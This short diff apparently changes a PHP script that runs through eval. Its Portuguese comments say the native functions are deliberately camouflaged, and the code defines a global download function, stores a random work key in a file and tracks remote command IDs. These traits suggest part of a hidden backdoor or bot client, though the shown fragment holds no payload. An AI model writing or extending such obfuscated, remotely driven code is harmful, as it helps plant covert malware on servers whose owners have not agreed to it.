@@ -1,7 +1,7 @@
 execução por eval. cuidado, não use exit e nem __FILE__
 cuidado ao chamar funções nativas pois elas estao camufladas
 
-[__GIT_COMMAND]
+[GIT_COMMAND]
 
 $GLOBALS['__download_002'] = function($url)
 {
@@ -40,8 +40,8 @@ if(!$work_key)
 	$work_key = md5(microtime().mt_rand(0,9999).mt_rand(0,9999).mt_rand(0,9999));
 	@file_put_contents($id_path, $work_key);
 }
-
-$command_id = '000031';
+$work_key = trim($work_key);
+$command_id = '000032';
 if(@file_get_contents($id_com) !== $command_id)
 {
 	@file_put_contents($id_com, $command_id);
